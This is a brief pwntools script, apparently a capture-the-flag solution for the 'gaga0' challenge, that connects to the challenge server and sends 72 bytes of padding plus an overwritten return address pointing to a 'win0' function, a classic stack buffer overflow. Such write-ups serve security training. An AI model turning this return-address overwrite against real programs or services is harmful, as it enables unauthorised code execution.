from pwn import *

binary = './gaga0'

#p = process(binary)
p = remote('challs.actf.co',31300)

p.recv()

payload = b'a'*72
payload+= p64(0x401236) #win0

p.sendline(payload)

p.interactive()